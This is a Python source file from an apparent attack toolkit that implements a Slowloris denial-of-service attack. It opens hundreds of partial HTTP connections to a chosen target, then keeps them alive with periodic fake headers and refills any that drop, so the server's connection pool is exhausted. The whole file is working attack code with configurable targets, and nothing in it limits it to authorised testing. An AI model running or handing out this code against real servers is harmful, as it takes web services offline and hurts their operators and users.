import random, threading, time, socket
from attacks.base import BaseAttack


class Slowloris(BaseAttack):
    """
    Slowloris: opens many partial HTTP connections and keeps them alive
    by sending incomplete headers, exhausting the server's connection pool.
    Pure socket — no raw frames, so no MAC resolution needed.
    """
    def run(self):
        target_ip   = self.params.get("target_ip", "")
        target_port = int(self.params.get("target_port", 80))
        num_sockets = int(self.params.get("num_sockets", 200))
        interval    = float(self.params.get("interval", 10))

        if not target_ip:
            self.log("Slowloris: no target IP", "error"); return

        self.log(f"Slowloris → {target_ip}:{target_port}  sockets={num_sockets}  keepalive={interval}s", "warn")
        self.log("  Opening partial HTTP connections …", "info")

        sockets = []
        writer  = self.open_pcap()   # pcap won't capture here (regular sockets) but keeps interface

        def make_socket():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target_ip, target_port))
                # Send a partial HTTP request — never send \r\n\r\n
                s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {target_ip}\r\n".encode())
                s.send(b"User-Agent: Mozilla/5.0\r\n")
                s.send(b"Accept: text/html\r\n")
                return s
            except Exception:
                return None

        # Open initial sockets
        for _ in range(num_sockets):
            if self._stop.is_set(): break
            s = make_socket()
            if s:
                sockets.append(s)
        self.log(f"  {len(sockets)} partial connections established", "info")

        # Keepalive loop — send a partial header every interval to prevent timeout
        while not self._stop.is_set():
            self.log(f"  Sending keepalive headers — {len(sockets)} connections alive", "info")
            dead = []
            for s in sockets:
                try:
                    s.send(f"X-Keep: {random.randint(1,9999)}\r\n".encode())
                except Exception:
                    dead.append(s)

            for s in dead:
                sockets.remove(s)

            # Refill dead connections
            while len(sockets) < num_sockets and not self._stop.is_set():
                s = make_socket()
                if s:
                    sockets.append(s)

            for _ in range(int(interval * 10)):
                if self._stop.is_set(): break
                time.sleep(0.1)

        # Cleanup
        for s in sockets:
            try: s.close()
            except Exception: pass
        writer.close()
        self.log("Slowloris stopped — all connections closed", "success")
